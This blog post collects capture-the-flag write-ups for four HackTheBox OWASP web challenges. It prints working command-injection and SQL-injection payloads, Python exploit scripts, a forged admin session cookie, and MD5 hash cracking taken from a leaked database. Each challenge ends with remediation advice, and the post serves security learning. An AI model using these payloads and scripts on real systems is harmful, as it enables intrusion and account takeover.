---
title: "HackTheBox - OWASP Top 10 Track - Web challenges part 1"
date: 2021-12-29
layout: single
tags:
  - web
---

The [OWASP Top 10 Track](https://app.hackthebox.com/tracks/OWASP-Top-10) is a collection of web challenges that security students can follow to get hands-on experience in exploiting the most critical security risks to web applications.

This post is part 1 of 2 of my writeups for this track, and contains the following challenges:

- [looking glass](#looking-glass)
- [sanitize](#sanitize)
- [baby auth](#baby-auth)
- [baby nginxatsu](#baby-nginxatsu)

## Quick disclaimer

My writeups are intended to showcase my understanding of various security concepts and my thought process when solving a problem. Hopefully they would also improve my technical-writing skills, which I believe is an extremely underrated skill in the security industry. I also share some analysis of vulnerabilites and sometimes what can be done to resolve or mitigate them. These are not intended to be tutorials or expert guides.

## looking glass

Description: *We've built the most secure networking tool in the market, come and check it out!*

Web application: `167.99.202.131:30675`

![looking-glass-home](/assets/ss-htb-owasp/looking-glass/looking_glass_1.jpg)

Run the 'Test', got the request in Burp:

```http
POST / HTTP/1.1
Host: 167.99.202.131:30675
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://167.99.202.131:30675
DNT: 1
Connection: close
Referer: http://167.99.202.131:30675/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

test=ping&ip_address=167.99.202.131&submit=Test
```

Test for simple command exection.

`test` -- could not make it work.

`ip_address` - works!

![looking-glass-home](/assets/ss-htb-owasp/looking-glass/looking_glass_2.jpg)

This confirms that the application is vulnerable to command injection, and we can run the command `whoami` on the remote host.

> 1.1.1.1; whoami; {more commands here}

Let's practice Python:

```python
#!/usr/bin/env python3

import requests
from urllib import parse
from bs4 import BeautifulSoup

target = "http://167.99.202.131:30675/"
command = "whoami; ls /; cat /flag_vWY4h"
data = "test=ping&ip_address=127.0.0.1%3b+" + command + "&submit=Test"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

print("[+] lester: connecting to target: " +target)
resp = requests.post(target, data, headers=headers)

soup = BeautifulSoup(resp.text, 'html.parser')
print("[+] lester: got textarea output: " +soup.textarea.text)
```

Result:

```txt
round-trip min/avg/max/stddev = 0.033/0.038/0.046/0.000 ms
www
bin
boot
dev
entrypoint.sh
etc
flag_vWY4h
home
lib
<snip>
www
HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}
juancho💀hackbox:looking-glass$ 
```

Got the flag.

Vulnerable PHP code at `/www/index.php`:

```php
<?php
function getUserIp()
{
    return $_SERVER['REMOTE_ADDR'];
}

function runTest($test, $ip_address)
{
    if ($test === 'ping')
    {
        system("ping -c4 ${ip_address}");
    }
    if ($test === 'traceroute')
    {
        system("traceroute ${ip_address}");
    }
}

?>

<!DOCTYPE html>
<html>
...
</html>
```

### Remarks

- **Finding**: User input from `GET` requests are passed to PHP function `system` without sanitization, leading to remote code execution.
- **Recommendation**: Sanitize the input before passing it to the `system` function. A basic check that can be added would be to confirm if "ip_address" is a valid IP address using [filter_var](https://www.php.net/manual/en/function.filter-var.php):

    ```php
    if(filter_var('127.0.0.1', FILTER_VALIDATE_IP) !== false) {
        // proceed
    } else {
        // throw an error to the user
    }
    ```

## sanitize

Description: *Can you escape the query context and log in as admin at my super secure login page?*

Web application: `139.59.166.5:31877`

![santize-1](/assets/ss-htb-owasp/sanitize/sanitize_1.jpg)

Tried `admin:admin` and got this response:

![santize-1](/assets/ss-htb-owasp/sanitize/sanitize_2.jpg)

```sql
select * from users where username = 'admin' AND password = 'admin';
```

Hint to a SQL injection vulnerability. Do a simple test:

```http
username=admin&password=admin'+OR+1%3d%3d1--
```

Result:

![santize-1](/assets/ss-htb-owasp/sanitize/sanitize_3.jpg)

> HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}

Let's practice Python:

```python
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

target = "http://139.59.166.5:31877"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
payload = "username=admin&password=admin'+OR+1%3d%3d1--"

print("[+] lester: Sending POST request to: " +target)
resp = requests.post(target, payload, headers=headers)
soup = BeautifulSoup(resp.text, 'html.parser')

print("[+] lester: Got slogan: " +soup.find('p').getText())
```

Output:

![santize-1](/assets/ss-htb-owasp/sanitize/sanitize_4.jpg)

### Remark

- **SQL Injection**: [This](https://www.php.net/manual/en/security.database.sql-injection.php) is one guide on how to help prevent SQL injection in PHP. Other modern web frameworks have also their own set of libraries and best practices to prevent SQL injection.

## baby auth

Description: *Who needs session integrity these days?*

Web application: `167.99.202.131:30509`

![baby-auth](/assets/ss-htb-owasp/baby-auth/baby_auth_1.jpg)

Try to login using random username and password combinations. Inspect the POST request:

```http
POST /auth/login HTTP/1.1
Host: 167.99.202.131:30509
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://167.99.202.131:30509
DNT: 1
Connection: close
Referer: http://167.99.202.131:30509/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin&password=admin
```

"Invalid username or password"

Try to register: <http://167.99.202.131:30509/register>

```http
POST /auth/register HTTP/1.1
Host: 167.99.202.131:30509
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://167.99.202.131:30509
DNT: 1
Connection: close
Referer: http://167.99.202.131:30509/register
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=pidnull&password=pidnull
```

Registration was possible. Login using `pidnull:pidnull`.

![baby-auth](/assets/ss-htb-owasp/baby-auth/baby_auth_2.jpg)

Inspect the request and response:

![baby-auth](/assets/ss-htb-owasp/baby-auth/baby_auth_3.jpg)

Base64 strings in cookies are always interesting. Inspect the string:

```bash
eyJ1c2VybmFtZSI6InBpZG51bGwifQ%3D%3D

# decode %3D%3d -> ==
eyJ1c2VybmFtZSI6InBpZG51bGwifQ==

juancho💀hackbox:baby-auth$ base64 -d <<< eyJ1c2VybmFtZSI6InBpZG51bGwifQ==; echo
{"username":"pidnull"}
juancho💀hackbox:baby-auth$ 
```

So the cookie `PHPSESSID` is a base64-encoded JSON string containing our username.

Can we spoof this to another username, such as `admin`?

```bash
# encode
juancho💀hackbox:baby-auth$ echo -n '{"username":"admin"}' | base64
eyJ1c2VybmFtZSI6ImFkbWluIn0=
juancho💀hackbox:baby-auth$ 

# try to login

```bash
juancho💀hackbox:baby-auth$ curl http://167.99.202.131:30509/ --cookie 'PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0=' | grep HTB
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2830  100  2830    0     0   9487      0 --:--:-- --:--:-- --:--:--  9496
                                                <h1>HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}</h1>
juancho💀hackbox:baby-auth$ 
```

It worked and gave us the flag!

> HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}

Let's practice Python:

```python
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

target = 'http://167.99.202.131:30509/'
spoofed_cookie = dict(PHPSESSID='eyJ1c2VybmFtZSI6ImFkbWluIn0=')

print("[+] lester: Getting that flag with a spoofed session cookie...")
resp = requests.get(target, cookies=spoofed_cookie)
soup = BeautifulSoup(resp.text, 'html.parser')

print("[+] lester: Got flag: " +soup.h1.getText())
```

Result:

![baby-auth](/assets/ss-htb-owasp/baby-auth/baby_auth_4.jpg)

### Remarks

- **Broken Access Control**: Although the application has a working login and registration functionality, the implementation of session management, which in this case is through the session cookie `PHPSESSID`, is weak enough that tampering with the cookie allows a malicious user to escalate privileges to another valid user such as `admin`.
- **Recommendation**: The application should replace the session management with one that could detect and prevent tampering with, such as JWT.

## baby nginxatsu

Description: *Can you find a way to login as the administrator of the website and free nginxatsu?*

Web application: `157.245.35.161:32681`

![baby-nginxatsu](/assets/ss-htb-owasp/baby-nginxatsu/baby_nginxatsu_1.jpg)

Inspect the request-response:

```http
Set-Cookie: XSRF-TOKEN=eyJpdiI6IkxHK0RjZ3pWNm1ZK0NveThzU1krL3c9PSIsInZhbHVlIjoibzRtTnNFTU9wdW1WZGZYcjZ4VmhvNXZEcE5NRXEzMVNnaE1takZ1YVZ5MlNwcTZXZW5tbEt3UzRwZTNQOGNwM1graGp1cVVwNm0rRmJZVHFRb01McXhmcHptaFQ5NU01K0NhQTMxaUh5WFhDcmJZTlJNbmh0TmtGVHdsZDFCN1IiLCJtYWMiOiI0NjUyMzNlMGM3NjUzNTY5ZTMxYzA4NmEwYTlhMWJiMzM2OTAwZGQwMjI4OTk0NWVmYjZkNmE5MWYzYzU4OWRjIn0%3D; expires=Tue, 28-Dec-2021 19:35:23 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6InVRdXF5Q3NtWVBaL1V6T1dpN0k2Y1E9PSIsInZhbHVlIjoibXd0NTFRanNGb0dKV1JIRVpaM2FYQWh0aDBPcmVjRTFsUFZ1RTRPRXBZTVhPN2pJaTZ1TGx6Wi9PbnVqQy9raFEwTk42aHZIbXAvR2dWZlM0Y1I4VlF0VDZ0UzNLOGE0TjRkczFQNTNjbm1iN0tEbEJlL0JSWGg0SzA2Q0ZPRlEiLCJtYWMiOiI5NWQyMjBkYTdiMTVjOTE0YmVlNTQ4ZTcwNWE5NTNiNjM2YjhiNDZjNWNlMDI0YzVmN2IxYjYyYzlmYTVlOTRhIn0%3D; expires=Tue, 28-Dec-2021 19:35:23 GMT; Max-Age=7200; path=/; httponly; samesite=lax
```

Decode URL and base64:

```txt
# XSRF-TOKEN:
{"iv":"LG+DcgzV6mY+Coy8sSY+/w==","value":"o4mNsEMOpumVdfXr6xVho5vDpNMEq31SghMmjFuaVy2Spq6WenmlKwS4pe3P8cp3X+hjuqUp6m+FbYTqQoMLqxfpzmhT95M5+CaA31iHyXXCrbYNRMnhtNkFTwld1B7R","mac":"465233e0c7653569e31c086a0a9a1bb336900dd02289945efb6d6a91f3c589dc"}

# laravel_session:
{"iv":"uQuqyCsmYPZ/UzOWi7I6cQ==","value":"mwt51QjsFoGJWRHEZZ3aXAhth0OrecE1lPVuE4OEpYMXO7jIi6uLlzZ/OnujC/khQ0NN6hvHmp/GgVfS4cR8VQtT6tS3K8a4N4ds1P53cnmb7KDlBe/BRXh4K06CFOFQ","mac":"95d220da7b15c914bee548e705a953b636b8b46c5ce024c5f7b1b62c9fa5e94a"}
```

Nothing interesting.

Try random username and password combinations in the login.

> These credentials do not match our records.

Register an account:

> admin@localhost.lcl
> admin:admin

Worked, was able to sign up for an account.

The application is for generating an Nginx config file using a web form.

![baby-nginxatsu](/assets/ss-htb-owasp/baby-nginxatsu/baby_nginxatsu_2.jpg)

POST request:

```http
POST /api/configs?api_token=6e3J8fPiz7gyllOJZEw2ZpLZ82CYu6jAIYJvvMicCnujd0IZ32D1kQVVsWQ9nmuVI5g3 HTTP/1.1
Host: 157.245.35.161:32681
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: de
Accept-Encoding: gzip, deflate
Referer: http://157.245.35.161:32681/
Content-Type: application/json
Origin: http://157.245.35.161:32681
Content-Length: 193
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IkllUmtJRlp3QmVuYmdnNHNIT1IzYWc9PSIsInZhbHVlIjoiMWZzVnFBQ1NzS3Q2Mm9iT2EzMWxsYTJzQWpSN3pQZXhyUlZmRmdDejhFSTVpSjRCd3k2L2s4TzBIWXVxQVJSNlZSbnJyb3BoZ2JHRklWV1FZQ0dqZ0JBcnBzdXZ5K05aQmd4ekxFa1JxQXNMQ3pBR2NleTRjTEVRRW43L0J3Q1oiLCJtYWMiOiI1YzI0MDc5MWY4ZGM5YjMyYWNjMWYyZTFjMzViNTViMGI0ZTFiYTgwN2FkNmUyNjRhNjhhMzc0NzE3ZjQyOTZmIn0%3D; laravel_session=eyJpdiI6Ikp5SmhSdXJjWWRLWmhHdjV6N1hveVE9PSIsInZhbHVlIjoib1UrVEhwd05ZWHY3UDdiMnpheVJaT05pbWVXWGlEL3h0anJ4VXI5NWVJSW8wOXdwdzVZbytDUzM4YXJ0VERlVDczSDZyVlZYeFlScS9GaERNbGUvMGVraEJ5c3AyLzVvc2ZPZnRsT0Z4cVpGWG0xeTBNR3gwNVYwUHpscnAyQVAiLCJtYWMiOiJiZGJhOTI5YmI2MjZlMzBmZGEyM2Y4NjJiY2M5MDQ0NzA4ZDBiMzBkZTFmYjUyNTMyY2NmYzdlZDA2ODA2MWEzIn0%3D
Sec-GPC: 1

{"server":{"name":"pidnull.lcl","port":"80","root":"/www/public","index":"index.php","user":"www","workers":"1024","tokens":"off"},"routes":[{"location":"/storage","directive":"autoindex on"}]}
```

Response:

```http
{"user_id":4,"file_name":"nginx_61cb5e763f9ec","updated_at":"2021-12-28T18:59:02.000000Z","created_at":"2021-12-28T18:59:02.000000Z","id":51}
```

Clicking on the 'configs' at the bottom returns the generated Nginx configuration:

```nginx
user www;
pid /run/nginx.pid;
error_log /dev/stderr info;

events {
    worker_connections 1024;
}

http {
    server_tokens off;

    charset utf-8;
    keepalive_timeout 20s;
    sendfile on;
    tcp_nopush on;
    client_max_body_size 2M;

    include  /etc/nginx/mime.types;

    server {
        listen 80;
        server_name pidnull.lcl;

        index index.php;
        root /www/public;

        # We sure hope so that we don't spill any secrets
        # within the open directory on /storage
        
        location /storage {
            autoindex on;
        }
        
        location / {
            try_files $uri $uri/ /index.php?$query_string;
            location ~ \.php$ {
                try_files $uri =404;
                fastcgi_pass unix:/run/php-fpm.sock;
                fastcgi_index index.php;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                include fastcgi_params;
            }
        }
    }
}
```

Go ahead and inspect the application closer. The section that generates the Nginx config / triggers the event.

```html
<section class="nes-container with-title">
    <h3 class="title">Generator</h3>
    <div class="section-grid">
        <button style="width: 200% !important;" onclick="generate()" class="nes-btn is-success">Generate Config</button>
    </div>
</section>
<section class="nes-container with-title">
    <h3 class="title">Configs</h3>
    <div class="row" id="configs"></div>
</section>
```

js file `/static/js/main.js` which contains the functions that POST the request and updates the page with links to the generated Nginx configs.

```javascript
const generate = () => {
    const name     = document.getElementById('server_name').value;
    const port     = document.getElementById('server_port').value;
    const root     = document.getElementById('root').value;
    const index    = document.getElementById('index').value;
    const user     = document.getElementById('user').value;
    const workers  = document.getElementById('worker_connections').value;
    const tokens   = document.getElementById('server_tokens').checked ? 'off' : 'on';

    fetch(`/api/configs?api_token=${API_TOKEN}`, {
        method: 'POST',
        body: JSON.stringify({
            server: { name, port, root, index, user, workers, tokens },
            routes: generateRoutes()
        }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(resp => {
        if (resp.ok) update();
    });
};
```

Nothing interesting, except for the generated URL such as <http://157.245.35.161:32681/config/51>

1. Is this accessible w/o authentication? -- No
2. Can we access configs other than `51`? -- Denied

Python loop from 0 to an arbitrary high value 200:

```python
#!/usr/bin/env python3

import requests

url = "http://157.245.35.161:32681/config/"
cookies = {'laravel_session': 'eyJpdiI6InFWdTdWbS9OV1A0b0tDeVhaVUgxaVE9PSIsInZhbHVlIjoiNFdvT05WazlIQytwZkRlUHZYOXQ5a2d1eXRkNUpOOHgrN1NGN1ljdTV2S1ZqWmkyem9mb2NTeVpwdTZIMzBGUDd2RGtqK1h2OU1lWEdvNVcxWFhOMmJmS1hCbXVLRklET3pYT09neDdKLzJYK3crYnpPYXp4TFNGWHlHYVhmQ1kiLCJtYWMiOiI5MTc1ZDQ5M2M5MzgyOThkZTNjNzdkMjJlNzJkZjZmZTUyOGIzM2Y5YzZmNTk3YTZhYzE1ZjQ3YTY4ZWZmNjNiIn0%3D'}

for x in range(0, 200):
  resp = requests.get(url+str(x), cookies=cookies)
  if(resp.status_code == 200):
      print("[+] lester: Got response 200 on index: " +str(x))
  elif(resp.status_code != 401 and resp.status_code!= 404):
      print("[+] lester: Got response: " +str(resp.status_code) +" on " +str(x))
```

No other configs found, only the Nginx config(s) I generated, all other indexes responded with either `401` or `404`. So there is no IDOR possible with `/config/X`.

What can I get with the API token to `/api/configs`?

```bash
juancho💀hackbox:Web$ curl --cookie "laravel_session=eyJpdiI6InFWdTdWbS9OV1A0b0tDeVhaVUgxaVE9PSIsInZhbHVlIjoiNFdvT05WazlIQytwZkRlUHZYOXQ5a2d1eXRkNUpOOHgrN1NGN1ljdTV2S1ZqWmkyem9mb2NTeVpwdTZIMzBGUDd2RGtqK1h2OU1lWEdvNVcxWFhOMmJmS1hCbXVLRklET3pYT09neDdKLzJYK3crYnpPYXp4TFNGWHlHYVhmQ1kiLCJtYWMiOiI5MTc1ZDQ5M2M5MzgyOThkZTNjNzdkMjJlNzJkZjZmZTUyOGIzM2Y5YzZmNTk3YTZhYzE1ZjQ3YTY4ZWZmNjNiIn0%3D" http://157.245.35.161:32681/api/configs?api_token=6e3J8fPiz7gyllOJZEw2ZpLZ82CYu6jAIYJvvMicCnujd0IZ32D1kQVVsWQ9nmuVI5g3 -q | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   289  100   289    0     0    702      0 --:--:-- --:--:-- --:--:--   701
[
  {
    "id": 51,
    "user_id": "4",
    "file_name": "nginx_61cb5e763f9ec",
    "created_at": "2021-12-28T18:59:02.000000Z",
    "updated_at": "2021-12-28T18:59:02.000000Z"
  },
  {
    "id": 52,
    "user_id": "4",
    "file_name": "nginx_61cb5f3fbe916",
    "created_at": "2021-12-28T19:02:23.000000Z",
    "updated_at": "2021-12-28T19:02:23.000000Z"
  }
]
juancho💀hackbox:Web$ 
```

Nothing new, this is the "index" of all accessible configs I already confirmed with the Python script.

To `/api`? Nope.

Check for URLs and endpoints using `Burp > Target > Site Map` and noticed `/storage`. Try:

```bash
juancho💀hackbox:Web$ curl --cookie "laravel_session=eyJpdiI6InFWdTdWbS9OV1A0b0tDeVhaVUgxaVE9PSIsInZhbHVlIjoiNFdvT05WazlI
QytwZkRlUHZYOXQ5a2d1eXRkNUpOOHgrN1NGN1ljdTV2S1ZqWmkyem9mb2NTeVpwdTZIMzBGUDd2RGtqK1h2OU1lWEdvNVcxWFhOMmJmS1hCbXVLRklET3pYT
09neDdKLzJYK3crYnpPYXp4TFNGWHlHYVhmQ1kiLCJtYWMiOiI5MTc1ZDQ5M2M5MzgyOThkZTNjNzdkMjJlNzJkZjZmZTUyOGIzM2Y5YzZmNTk3YTZhYzE1Zj
Q3YTY4ZWZmNjNiIn0%3D" http://157.245.35.161:32681/storage/
<html>
<head><title>Index of /storage/</title></head>
<body>
<h1>Index of /storage/</h1><hr><pre><a href="../">../</a>
<a href="nginx_61cb4aaaf03ba.conf">nginx_61cb4aaaf03ba.conf</a>                           28-Dec-2021 17:34              
  1101
<a href="nginx_61cb4aaaf1a75.conf">nginx_61cb4aaaf1a75.conf</a>                           28-Dec-2021 17:34              
  1101
<a href="nginx_61cb4aab0cc4e.conf">nginx_61cb4aab0cc4e.conf</a>                           28-Dec-2021 17:34              
  1101
<a href="nginx_61cb4aab0d82a.conf">nginx_61cb4aab0d82a.conf</a>                           28-Dec-2021 17:34              
  1101
...
<a href="nginx_61cb4aab24fce.conf">nginx_61cb4aab24fce.conf</a>                           28-Dec-2021 17:34                1101
<a href="nginx_61cb5e763f9ec.conf">nginx_61cb5e763f9ec.conf</a>                           28-Dec-2021 18:59                 983
<a href="nginx_61cb5f3fbe916.conf">nginx_61cb5f3fbe916.conf</a>                           28-Dec-2021 19:02                 983
<a href="v1_db_backup_1604123342.tar.gz">v1_db_backup_1604123342.tar.gz</a>                     28-Dec-2021 17:34               42496
</pre><hr></body>
</html>
```

It's the list of all the Nginx configs, with an interesting archive file at the bottom. Is this directory even authenticated?

```bash
# test without the session token:
juancho💀hackbox:Web$ curl http://157.245.35.161:32681/storage/v1_db_backup_1604123342.tar.gz -o v1_db_backup_1604123342.tar.gz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 42496  100 42496    0     0  90116      0 --:--:-- --:--:-- --:--:-- 90033
juancho💀hackbox:Web$
```

Worked -- no authentication required!

```bash
juancho💀hackbox:Web$ file v1_db_backup_1604123342.tar.gz
v1_db_backup_1604123342.tar.gz: POSIX tar archive (GNU)
juancho💀hackbox:Web$ 
# rename:
juancho💀hackbox:baby-nginxatsu$ mv v1_db_backup_1604123342.tar.gz v1_db_backup_1604123342.tar
juancho💀hackbox:baby-nginxatsu$ tar tf v1_db_backup_1604123342.tar
database/database.sqlite
juancho💀hackbox:baby-nginxatsu$ tar xf v1_db_backup_1604123342.tar
juancho💀hackbox:baby-nginxatsu$ file database/database.sqlite 
database/database.sqlite: SQLite 3.x database, last written using SQLite version 3033000, file counter 65, database pages 10, cookie 0x8, schema 4, UTF-8, version-valid-for 65
juancho💀hackbox:baby-nginxatsu$ 
```

It's a SQLite database. Inspect:

```sql
SQLite version 3.36.0 2021-06-18 18:36:39
Enter ".help" for usage hints.
sqlite> .tables
failed_jobs      nginx_configs    users          
migrations       password_resets
sqlite> .headers on
sqlite> SELECT * FROM users;
id|name|email|password|api_token|remember_token|created_at|updated_at
1|jr|nginxatsu-adm-01@makelarid.es|e7816e9a10590b1e33b87ec2fa65e6cd|eKKhcLmo8t79oNRiyAsSKHXIX4Y2ERUDN30eANwo36FYBthTcUWJQKYKejMMZoeA1NTt||2021-12-28 17:34:34|2021-12-28 17:34:34
2|Giovann1|nginxatsu-giv@makelarid.es|7b338014fa4076d52202957492855bf4|LcMa92G8wVj4VhSyM1gbSgAL0NMWRe79cQ3e8IlTdYK7OvVrpANv8dRJD9B4czJVmemC||2021-12-28 17:34:34|2021-12-28 17:34:34
3|me0wth|nginxatsu-me0wth@makelarid.es|aedbe32c58377ab5485e4fb3542386d3|akIzwvfdmipat7iC19rgFCeaaDijE5JYEs1FAPORtu4wviFzXbVxM6ILGEGxOpw2Axhe||2021-12-28 17:34:34|2021-12-28 17:34:34
sqlite> 
```

There is one interesting 'admin' user `jr` with email address `nginxatsu-adm-01@makelarid.es`:

- `api_token`: eKKhcLmo8t79oNRiyAsSKHXIX4Y2ERUDN30eANwo36FYBthTcUWJQKYKejMMZoeA1NTt

This user also has these in "nginx_configs":

```txt
sqlite> SELECT * FROM nginx_configs WHERE user_id = 1;
id|user_id|file_name|created_at|updated_at
1|1|nginx_61cb4aaaf03ba|2021-12-28 17:34:34|2021-12-28 17:34:34
8|1|nginx_61cb4aab0fb3b|2021-12-28 17:34:35|2021-12-28 17:34:35
17|1|nginx_61cb4aab14292|2021-12-28 17:34:35|2021-12-28 17:34:35
20|1|nginx_61cb4aab1598d|2021-12-28 17:34:35|2021-12-28 17:34:35
22|1|nginx_61cb4aab16a4f|2021-12-28 17:34:35|2021-12-28 17:34:35
34|1|nginx_61cb4aab1caa4|2021-12-28 17:34:35|2021-12-28 17:34:35
36|1|nginx_61cb4aab1e5c6|2021-12-28 17:34:35|2021-12-28 17:34:35
42|1|nginx_61cb4aab214c3|2021-12-28 17:34:35|2021-12-28 17:34:35
49|1|nginx_61cb4aab24853|2021-12-28 17:34:35|2021-12-28 17:34:35
sqlite> 
```

So with this SQLite table, I can map which nginx configs a user generated, and has access to using `/config/X`.

Try to list the configs again, using the laraval_session for the user that I created but the API token from the sqlite dump for user `jr`.

```bash
juancho💀hackbox:baby-nginxatsu$ curl --cookie "laravel_session=eyJpdiI6IlNDZUxrVEJ2blc0ZDExTGpFUUNzYUE9PSIsInZhbHVlIjoiZUw4WmZ1RFQyYjhYbTFyRFRWNHlJRlRyMk5jM3gzNytJRkY1VXVCUm9weHVsVGRzUGEveGdNTlVmVkxYdGJzK2dHSC8vQ3hoYmdZbitSdjg4ZzFNNmRocExMZWlUeEgzcDdCdVRMNG5VQTQrVWltbzQzbEpIbzRhSnVVcnUyNTMiLCJtYWMiOiJhN2FhNzI3YmI0YzdhMGY2OTNhYmZhYzYxYWU3OWYzNGMyOGE4NTQ1NWY5MDZmMDcyZmI3NTVhN2U1NmI1OGM5In0%3D" http://157.245.35.161:32681/api/configs?api_token=eKKhcLmo8t79oNRiyAsSKHXIX4Y2ERUDN30eANwo36FYBthTcUWJQKYKejMMZoeA1NTt | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1295  100  1295    0     0   3327      0 --:--:-- --:--:-- --:--:--  3329
[   
  {
    "id": 1, 
    "user_id": "1",
    "file_name": "nginx_61cb4aaaf03ba",
    "created_at": "2021-12-28T17:34:34.000000Z",
    "updated_at": "2021-12-28T17:34:34.000000Z"
  },
...
  {
    "id": 42,
    "user_id": "1",
    "file_name": "nginx_61cb4aab214c3",
    "created_at": "2021-12-28T17:34:35.000000Z",
    "updated_at": "2021-12-28T17:34:35.000000Z"
  },
  {
    "id": 49,
    "user_id": "1",
    "file_name": "nginx_61cb4aab24853",
    "created_at": "2021-12-28T17:34:35.000000Z",
    "updated_at": "2021-12-28T17:34:35.000000Z"
  }
]
```

Worked, so as long as I am logged in as a valid user and the API token of another user, I can get the configs using `/config/X`.

Going back to `/storage` again, get all the Nginx configs and see if any of them contain anything interesting.

```bash
curl http://157.245.35.161:32681/storage/ > out
grep -o "nginx_.*.conf" out | sed 's/".*//g' > filenames.txt

mkdir nginx_download
while read line; do curl http://157.245.35.161:32681/storage/$line -o nginx_download/$line; done<filenames.txt

# inspect:
 1101 nginx_download/nginx_61cb4aab24853.conf
 1101 nginx_download/nginx_61cb4aab24fce.conf
  983 nginx_download/nginx_61cb5e763f9ec.conf
  983 nginx_download/nginx_61cb5f3fbe916.conf
57016 total
juancho💀hackbox:baby-nginxatsu$ 
juancho💀hackbox:baby-nginxatsu$ 
juancho💀hackbox:baby-nginxatsu$ wc -c nginx_download/*
```

Nothing interesting in these Nginx configs.

Go back to the leaked API key..and the table.

Inspect the password `e7816e9a10590b1e33b87ec2fa65e6cd` with `hash-identifier` -- it's MD5. Try to crack it with `rockyou.txt`.

```bash
cat <<EOF > passwords.txt
e7816e9a10590b1e33b87ec2fa65e6cd
7b338014fa4076d52202957492855bf4
aedbe32c58377ab5485e4fb3542386d3
EOF
```

Hashcat found 1 password, which is conveniently the passwor for the user which we think is the admin.

- `e7816e9a10590b1e33b87ec2fa65e6cd`: `adminadmin1`
- `7b338014fa4076d52202957492855bf4`: none
- `aedbe32c58377ab5485e4fb3542386d3`: none

Credential: `nginxatsu-adm-01@makelarid.es`:`adminadmin1`

Worked!

![baby-nginxatsu](/assets/ss-htb-owasp/baby-nginxatsu/baby_nginxatsu_3.jpg)

### Findings

1. **Broken Access Control**: There exists an unauthenticated storage `/storage` containing application data (Nginx configs) generated by all users.
**Recommendation**: All endpoints must use the same access control as much as possible.
2. **Sensitive Data Exposure**: Database dump of the application is stored in `/storage` containing password hashes and API tokens. **Recommendation**: Even if this endpoint were authenticated, the database dump should not have been stored where the application data is stored. If there was a valid need for it to be stored there, there should be enough file protections on it, such as file encryption or storing it in a password protected archive.

---

Come back soon for part 2! ;)

\- [Lester](https://twitter.com/pidnull)
